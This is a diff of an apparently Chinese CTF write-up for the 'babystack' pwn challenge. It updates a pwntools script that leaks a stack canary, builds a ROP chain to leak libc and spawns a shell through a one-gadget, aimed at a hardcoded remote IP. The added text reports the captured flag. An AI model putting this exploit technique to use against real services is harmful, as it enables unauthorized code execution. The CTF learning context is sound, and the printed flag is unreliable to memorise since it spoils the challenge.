@@ -93,36 +93,34 @@ from pwn import *
 context.arch = "amd64"
 context.log_level = "debug"
  
-elf = ELF("./babystack")
-p = remote('111.198.29.45','45381')
+p = remote('61.147.171.105','56381')
 #p = process("./babystack")
-libc = ELF("./libc-2.23.so")
  
 execve = 0x45216
 main_addr = 0x400908
-puts_got = elf.got['puts']
-puts_plt = elf.plt['puts']
+puts_got = 6295464
+puts_plt = 4195984
 pop_rdi = 0x0400a93
  
-payload = 'a'*0x88
+payload = b'a'*0x88
 p.sendlineafter(">> ","1")
 p.sendline(payload)
  
 p.sendlineafter(">> ","2")
-p.recvuntil('a'*0x88+'\n')
+p.recvuntil(b'a'*0x88+b'\n')
  
-canary = u64(p.recv(7).rjust(8,'\x00'))
+canary = u64(p.recv(7).rjust(8,b'\x00'))
  
-payload1 = 'a'*0x88+p64(canary)+'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+payload1 = b'a'*0x88+p64(canary)+b'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
  
 p.sendlineafter(">> ","1")
 p.send(payload1)
 p.sendlineafter(">> ","3")
-puts_addr=u64(p.recv(8).ljust(8,'\x00'))
+puts_addr=u64(p.recv(8).ljust(8,b'\x00'))
  
-execve_addr = puts_addr - (libc.symbols['puts'] - execve)
+execve_addr = puts_addr - (456336 - execve)
  
-payload2 = 'a'*0x88+p64(canary)+'a'*8 + p64(execve_addr)
+payload2 = b'a'*0x88+p64(canary)+b'a'*8 + p64(execve_addr)
  
 p.sendlineafter(">> ","1")
 p.sendline(payload2)
@@ -132,4 +130,8 @@ p.interactive()
 
 当然用普通方法在libc里找/bin/sh再调用system也是可以的。具体[看这](https://blog.csdn.net/Y_peak/article/details/114234059)。原理只要你看懂第一个rop链就能懂了。
 
-我也不知道我怎么做到既无法做题也不懂的情况下扯这么多的。
+我突然意识到我可以在能运行elf的机子上拿出需要的地址再放到能连接nc的机子上运行。于是我拿到flag了。（＾∇＾）
+
+
+- ### Flag
+  > cyberpeace{0c15875a74f4ef361b8f05004c722e19}
